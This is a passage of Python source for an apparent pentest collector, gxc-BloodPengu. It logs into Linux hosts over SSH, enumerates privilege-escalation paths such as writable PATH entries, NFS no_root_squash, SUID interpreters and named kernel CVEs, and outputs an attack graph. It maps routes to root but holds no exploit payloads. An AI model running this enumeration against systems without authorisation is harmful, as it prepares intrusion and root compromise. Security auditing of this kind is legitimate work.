                                        "cap_sys_module", "cap_sys_rawio"):
                            self._add_edge(cu_id, "KernelExploit", "user:root", risk="critical",
                                           properties={"description": cap_desc,
                                                       "kernel_version": uname_r,
                                                       "entry": line.strip()})
                        finding_count += 1
                        break

        path_dirs = self.run("echo $PATH").strip().split(":")
        for d in path_dirs:
            d = d.strip()
            if not d or d in ("/usr/bin", "/bin", "/usr/sbin", "/sbin"):
                continue
            if self.writable(d):
                self._add_finding("CRITICAL", "kernel",
                    f"Writable directory in PATH: {d}  |  binary hijack for any root-invoked command",
                    d)
                self._add_edge(cu_id, "KernelExploit", "user:root", risk="critical",
                               properties={"description": "Writable PATH directory - command hijack",
                                           "kernel_version": uname_r,
                                           "entry": d})
                finding_count += 1

        ld_preload = self.run("echo $LD_PRELOAD").strip()
        ld_library = self.run("echo $LD_LIBRARY_PATH").strip()
        if ld_preload and ld_preload not in ("", "/dev/null"):
            self._add_finding("CRITICAL", "kernel",
                f"LD_PRELOAD set: {ld_preload}  |  shared object injection active", ld_preload)
            finding_count += 1
        if ld_library and ld_library not in ("",):
            self._add_finding("HIGH", "kernel",
                f"LD_LIBRARY_PATH set: {ld_library}  |  library resolution hijack possible", ld_library)
            finding_count += 1
        lib_confd = self.run_lines("cat /etc/ld.so.conf.d/*.conf 2>/dev/null | grep -v '^#'")
        for lib_dir in lib_confd:
            lib_dir = lib_dir.strip()
            if lib_dir and self.writable(lib_dir):
                self._add_finding("CRITICAL", "kernel",
                    f"Writable ld.so.conf.d library directory: {lib_dir}  |  shared library hijack",
                    lib_dir)
                finding_count += 1

        nfs_exports = self.run("cat /etc/exports 2>/dev/null").strip()
        if nfs_exports:
            for line in nfs_exports.splitlines():
                if "no_root_squash" in line.lower():
                    self._add_finding("CRITICAL", "kernel",
                        f"NFS export with no_root_squash: {line.strip()}  |  mount as remote root for direct LPE",
                        line)
                    self._add_edge(cu_id, "KernelExploit", "user:root", risk="critical",
                                   properties={"description": "NFS no_root_squash allows remote root mount",
                                               "kernel_version": uname_r,
                                               "entry": line.strip()})
                    finding_count += 1
                if "no_all_squash" in line.lower():
                    self._add_finding("HIGH", "kernel",
                        f"NFS export with no_all_squash: {line.strip()}", line)
                    finding_count += 1

        loaded_mods = self.run("lsmod 2>/dev/null | tail -n +2 | awk '{print $1}'").strip()
        RISKY_MODS = {
            "vboxsf":    ("POTENTIAL", "VirtualBox shared folder module loaded - guest additions present"),
            "vmhgfs":    ("POTENTIAL", "VMware HGFS module loaded - shared folder attack surface"),
            "nf_tables": ("POTENTIAL", "nf_tables loaded - verify against nftables CVE family"),
            "ip_tables": ("POTENTIAL", "ip_tables loaded"),
            "xt_owner":  ("POTENTIAL", "xt_owner netfilter module loaded"),
            "overlayfs": ("POTENTIAL", "overlayfs loaded - verify against overlayfs CVE family"),
            "bpf":       ("POTENTIAL", "BPF module loaded - verify against eBPF LPE family"),
        }
        if loaded_mods:
            for mod_line in loaded_mods.splitlines():
                mod_name = mod_line.strip().lower()
                if mod_name in RISKY_MODS:
                    tier, mod_desc = RISKY_MODS[mod_name]
                    self._add_finding(tier, "kernel",
                        f"Kernel module {mod_name}: {mod_desc}", mod_name)
                    finding_count += 1

        dmesg_out = self.run("dmesg 2>/dev/null | tail -20 | grep -iE '(selinux|apparmor|seccomp)' | head -5").strip()
        selinux   = self.run("getenforce 2>/dev/null || sestatus 2>/dev/null | head -1").strip()
        apparmor  = self.run("aa-status 2>/dev/null | head -3 || apparmor_status 2>/dev/null | head -3").strip()
        seccomp   = self.run("grep Seccomp /proc/self/status 2>/dev/null").strip()
        if selinux and "enforcing" in selinux.lower():
            self._add_finding("POTENTIAL", "kernel",
                f"SELinux enforcing: {selinux}  |  check for policy bypasses or permissive domains", selinux)
        elif selinux and "permissive" in selinux.lower():
            self._add_finding("HIGH", "kernel",
                f"SELinux permissive mode: {selinux}  |  MAC not blocking - LPE unrestricted", selinux)
            finding_count += 1
        if apparmor and "enforce" not in apparmor.lower():
            self._add_finding("POTENTIAL", "kernel",
                f"AppArmor status: {apparmor[:100]}", apparmor[:100])
        if seccomp:
            seccomp_val = seccomp.split(":")[-1].strip()
            if seccomp_val == "0":
                self._add_finding("HIGH", "kernel",
                    "Seccomp disabled for this process (Seccomp: 0)  |  all syscalls available", seccomp)
                finding_count += 1

        pam_raw = self.run(
            "find /lib/security /lib/x86_64-linux-gnu/security /usr/lib/security"
            " /usr/lib/x86_64-linux-gnu/security -name '*.so' 2>/dev/null | head -5"
        ).strip()
        if pam_raw:
            self._add_finding("POTENTIAL", "kernel",
                f"PAM modules present: {pam_raw.splitlines()[0]}  |  check CVE-2025-6018/CVE-2025-6019 on openSUSE/SUSE",
                pam_raw[:200])

        vsock_check = self.run("lsmod 2>/dev/null | grep -i vsock").strip()
        if vsock_check:
            self._add_finding("HIGH", "kernel",
                f"CVE-2025-21756  |  vsock module loaded: {vsock_check}  |  Attack of the Vsock - VM escape to host root on kernels 6.8/6.11/6.12",
                "https://nvd.nist.gov/vuln/detail/CVE-2025-21756")
            finding_count += 1

        timers = self.run(
            "find /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system"
            " -name '*.timer' 2>/dev/null | head -10"
        )
        if timers:
            for tpath in timers.splitlines():
                tpath = tpath.strip()
                if tpath and self.writable(tpath):
                    self._add_finding("CRITICAL", "kernel",
                        f"Writable systemd timer: {tpath}  |  schedule arbitrary execution as root", tpath)
                    self._add_edge(cu_id, "KernelExploit", "user:root", risk="critical",
                                   properties={"description": "Writable systemd timer for root code execution",
                                               "kernel_version": uname_r,
                                               "entry": tpath})
                    finding_count += 1

        dbus_conf = self.run(
            "find /etc/dbus-1 /usr/share/dbus-1 -name '*.conf' 2>/dev/null | head -5"
        ).strip()
        if dbus_conf:
            for dpath in dbus_conf.splitlines():
                dpath = dpath.strip()
                if dpath and self.writable(dpath):
                    self._add_finding("HIGH", "kernel",
                        f"Writable D-Bus policy file: {dpath}  |  privilege escalation via D-Bus service impersonation",
                        dpath)
                    finding_count += 1

        interp_suids = self.run(
            "find / \\( -perm -4000 \\) -type f 2>/dev/null"
            " | xargs -I{} basename {} 2>/dev/null"
            " | grep -E '^(python|python3|perl|ruby|lua|php|node|tclsh|wish)' | head -10"
        ).strip()
        if interp_suids:
            for interp in interp_suids.splitlines():
                self._add_finding("CRITICAL", "kernel",
                    f"Interpreter with SUID bit: {interp.strip()}  |  trivial shell spawn to root", interp)
                finding_count += 1

        core_pattern = self.run("cat /proc/sys/kernel/core_pattern 2>/dev/null").strip()
        if core_pattern and core_pattern.startswith("|"):
            self._add_finding("HIGH", "kernel",
                f"core_pattern pipes to handler: {core_pattern}  |  crash a SUID binary to invoke handler as root",
                core_pattern)
            finding_count += 1

        log_ok(f"Kernel: {uname_r}  |  CVE matches: {len(deduped)}  |  Total LPE findings: {finding_count}")

    def collect_mi6(self):
        mod = load_module("mi6")
        if mod:
            mod.run(self)
        else:
            log_err("Module mi6 not found in modules/")

    def run_all(self):
        self.collect_users()
        self.collect_sudo()
        self.collect_suid()
        self.collect_groups()
        self.collect_services()
        self.collect_cron()
        self.collect_kernel()
        self.collect_containers()
        self.collect_network()
        self.collect_env()
        self.collect_sacspengu()
        self.collect_avrisk()
        self.collect_brace()
        self.collect_kernel_module()

    def run_module(self, module):
        available = get_available_modules()
        if module not in available:
            log_err(f"Unknown module: {module}  |  Available: {', '.join(available.keys())}")
            sys.exit(1)
        self.collect_users()
        self.collect_groups()
        if module == "kernel":
            self.collect_kernel_module()
            return
        if module == "mi6":
            self.collect_mi6()
            return
        mod = load_module(module)
        if not mod:
            log_err(f"Could not load module file: modules/{module}.py")
            sys.exit(1)
        mod.run(self)


LEGACY_ALGORITHMS = {
    "keys":     ["rsa-sha2-256", "rsa-sha2-512", "ssh-rsa"],
    "kex":      [
        "diffie-hellman-group1-sha1",
        "diffie-hellman-group14-sha1",
        "diffie-hellman-group-exchange-sha1",
        "diffie-hellman-group14-sha256",
        "diffie-hellman-group-exchange-sha256",
        "ecdh-sha2-nistp256",
        "ecdh-sha2-nistp384",
        "ecdh-sha2-nistp521",
        "curve25519-sha256",
        "curve25519-sha256@libssh.org",
    ],
    "ciphers":  [
        "aes128-cbc", "aes192-cbc", "aes256-cbc",
        "3des-cbc", "blowfish-cbc", "arcfour", "arcfour128", "arcfour256",
        "aes128-ctr", "aes192-ctr", "aes256-ctr",
        "aes128-gcm@openssh.com", "aes256-gcm@openssh.com",
    ],
    "macs":     [
        "hmac-sha1", "hmac-sha1-96", "hmac-md5", "hmac-md5-96",
        "hmac-sha2-256", "hmac-sha2-512",
        "umac-64@openssh.com", "umac-128@openssh.com",
    ],
    "pubkeys":  [
        "ssh-rsa", "ssh-dss",
        "ecdsa-sha2-nistp256", "ecdsa-sha2-nistp384", "ecdsa-sha2-nistp521",
        "ssh-ed25519", "rsa-sha2-256", "rsa-sha2-512",
    ],
}


def _load_pkey(key_file):
    try:
        return paramiko.PKey.from_private_key_file(key_file)
    except AttributeError:
        pass
    except Exception:
        pass
    for key_class in (paramiko.RSAKey, paramiko.Ed25519Key, paramiko.ECDSAKey):
        try:
            return key_class.from_private_key_file(key_file)
        except Exception:
            continue
    return None


def _connect_kwargs(old_ssh):
    kwargs = {
        "timeout":      30,
        "auth_timeout": 30,
        "allow_agent":  False,
        "look_for_keys":False,
    }
    if old_ssh:
        kwargs["disabled_algorithms"] = {"pubkeys": []}
        kwargs["preferred_algorithms"] = LEGACY_ALGORITHMS
    return kwargs


def _jump_sock(jumphost, jumphost_key, old_ssh, target, port):
    parts    = jumphost.split("@")
    userpart = parts[0] if len(parts) == 2 else "root"
    hostpart = parts[-1]

    jpass = None
    juser = userpart
    if ":" in juser:
        juser, jpass = juser.split(":", 1)

    jhost = hostpart
    jport = 22
    if ":" in hostpart:
        jhost, jport_str = hostpart.rsplit(":", 1)
        try:
            jport = int(jport_str)
        except ValueError:
            pass

    jclient = paramiko.SSHClient()
    jclient.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    kw = _connect_kwargs(old_ssh)

    if jumphost_key:
        jumphost_key = os.path.expanduser(jumphost_key)
        pkey = _load_pkey(jumphost_key)
        if pkey is None:
            log_err(f"Could not load jumphost key: {jumphost_key}")
            sys.exit(1)
        jclient.connect(hostname=jhost, port=jport, username=juser, pkey=pkey, **kw)
    else:
        jclient.connect(hostname=jhost, port=jport, username=juser, password=jpass, **kw)

    transport = jclient.get_transport()
    channel   = transport.open_channel(
        "direct-tcpip",
        (target, port),
        ("127.0.0.1", 0),
    )
    return channel, jclient


def connect_ssh(target, port, username, password, key_file,
                old_ssh=False, jumphost=None, jumphost_key=None):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    sock       = None
    jclient    = None

    if jumphost:
        sock, jclient = _jump_sock(jumphost, jumphost_key, old_ssh, target, port)
    else:
        try:
            raw = socket.create_connection((target, port), timeout=30)
            raw.settimeout(None)
            sock = raw
        except Exception:
            sock = None

    kw = _connect_kwargs(old_ssh)
    if sock is not None:
        kw["sock"] = sock

    try:
        if key_file:
            key_file = os.path.expanduser(key_file)
            if not os.path.exists(key_file):
                log_err(f"Key file not found: {key_file}")
                sys.exit(1)
            pkey = _load_pkey(key_file)
            if pkey is None:
                log_err(f"Could not load key: {key_file} - unsupported format or bad passphrase")
                sys.exit(1)
            client.connect(hostname=target, port=port, username=username, pkey=pkey, **kw)
        else:
            client.connect(hostname=target, port=port, username=username, password=password, **kw)

        client._bloodpengu_jclient = jclient
        return client

    except paramiko.AuthenticationException:
        log_err(f"Authentication failed - {username}@{target}:{port}")
        sys.exit(1)
    except paramiko.ssh_exception.NoValidConnectionsError:
        log_err(f"Cannot connect to {target}:{port} - host down or port closed")
        sys.exit(1)
    except socket.timeout:
        log_err(f"Connection timed out: {target}:{port}")
        sys.exit(1)
    except socket.gaierror:
        log_err(f"Cannot resolve host: {target}")
        sys.exit(1)
    except Exception as e:
        log_err(f"SSH error: {e}")
        sys.exit(1)


def parse_args():
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument("target",        nargs="?",  default=None)
    parser.add_argument("-u",            dest="username",     default=None)
    parser.add_argument("-p",            dest="password",     default=None)
    parser.add_argument("-k",            dest="key_file",     default=None)
    parser.add_argument("-d",            dest="domain",       default=None)
    parser.add_argument("--port",        dest="port",         type=int, default=22)
    parser.add_argument("-M",            dest="module",       default=None)
    parser.add_argument("-o",            dest="output",       default="pypengu-output.json")
    parser.add_argument("-v",            dest="verbose",      action="store_true", default=False)
    parser.add_argument("--no-color",    dest="no_color",     action="store_true", default=False)
    parser.add_argument("--old-ssh",     dest="old_ssh",      action="store_true", default=False)
    parser.add_argument("--jumphost",    dest="jumphost",     default=None)
    parser.add_argument("--jumphost-key",dest="jumphost_key", default=None)
    parser.add_argument("-h","--help",   dest="help",         action="store_true", default=False)
    return parser.parse_args()


def main():
    global NO_COLOR
    args = parse_args()

    if args.no_color:
        NO_COLOR = True

    if args.help or args.target is None:
        print_help()
        sys.exit(0)

    if not args.username:
        banner()
        log_err("Username required: -u <username>")
        sys.exit(1)

    if not args.password and not args.key_file:
        banner()
        log_err("Authentication required: -p <password>  or  -k <key_file>")
        sys.exit(1)

    available = get_available_modules()
    if args.module and args.module not in available:
        banner()
        log_err(f"Unknown module: {args.module}  |  Available: {', '.join(available.keys())}")
        sys.exit(1)

    banner()
    divider()

    auth_label = f"key:{args.key_file}" if args.key_file else "password"
    log_info(f"Target  : {c(WHITE, args.target)}:{c(WHITE, str(args.port))}")
    log_info(f"User    : {c(WHITE, args.username)}")
    log_info(f"Auth    : {c(WHITE, auth_label)}")
    if args.domain:
        log_info(f"Domain  : {c(WHITE, args.domain)}")
    if args.jumphost:
        log_info(f"Jump    : {c(WHITE, args.jumphost)}")
    if args.old_ssh:
        log_info(f"SSH     : {c(BORANGE, 'legacy mode (--old-ssh)')}")
    log_info(f"Mode    : {c(BORANGE, args.module) if args.module else c(WHITE, 'full collection')}")
    log_info(f"Output  : {c(WHITE, args.output)}")
    print()

    log_info(f"Connecting to {args.target}:{args.port}...")
    t0     = time.time()
    client = connect_ssh(
        args.target, args.port, args.username, args.password, args.key_file,
        old_ssh=args.old_ssh,
        jumphost=args.jumphost,
        jumphost_key=args.jumphost_key,
    )
    log_ok(f"Connected in {time.time()-t0:.2f}s  -  {args.username}@{args.target}:{args.port}")

    uname = client.exec_command("uname -a 2>/dev/null")[1].read().decode("utf-8", errors="replace").strip()
    log_ok(f"Remote  : {c(DGREY, uname)}")
    print()
    divider()

    collector = SSHCollector(client, args.target, args.domain, args.verbose)
    t_start   = time.time()

    if args.module:
        collector.run_module(args.module)
    else:
        collector.run_all()

    client.close()
    jclient = getattr(client, "_bloodpengu_jclient", None)
    if jclient:
        jclient.close()

    elapsed  = time.time() - t_start
    output   = collector.build_output()
    findings = collector._findings
    edges    = output["edges"]
    nodes    = output["nodes"]
    critical = sum(1 for f in findings if f["tier"] == "CRITICAL")
    high     = sum(1 for f in findings if f["tier"] == "HIGH")
    potential= sum(1 for f in findings if f["tier"] == "POTENTIAL")

    out_dir = os.path.dirname(args.output)
    if out_dir:
        os.makedirs(out_dir, exist_ok=True)
    with open(args.output, "w") as fh:
        json.dump(output, fh, indent=2)

    print()
    divider()
    log_ok(f"Collection complete in {elapsed:.2f}s")
    print()
    print(f"  {c(BRED,    '[CRITICAL ]')}  {c(WHITE, str(critical))}")
    print(f"  {c(BORANGE, '[HIGH     ]')}  {c(WHITE, str(high))}")
    print(f"  {c(ORANGE,  '[POTENTIAL]')}  {c(WHITE, str(potential))}")
    print()
    print(f"  {c(BORANGE, '[~]')}  {c(DGREY, 'Total findings  :')}  {c(WHITE, str(len(findings)))}")
    print(f"  {c(BORANGE, '[~]')}  {c(DGREY, 'Graph nodes     :')}  {c(WHITE, str(len(nodes)))}")
    print(f"  {c(BORANGE, '[~]')}  {c(DGREY, 'Graph edges     :')}  {c(WHITE, str(len(edges)))}")
    print(f"  {c(BORANGE, '[~]')}  {c(DGREY, 'Output file     :')}  {c(WHITE, args.output)}")
    print()
    log_ok(f"Import {c(WHITE, args.output)} into BloodPengu via Import JSON")
    print()
    divider()
    print(f"  {c(DGREY, 'gxc-BloodPengu.py')} v{BP_VERSION} by <@byt3n33dl3> {c(BORANGE, '<github.com/byt3n33dl3/gxc-BloodPengu.py>')}")
    print()


if __name__ == "__main__":
    main()
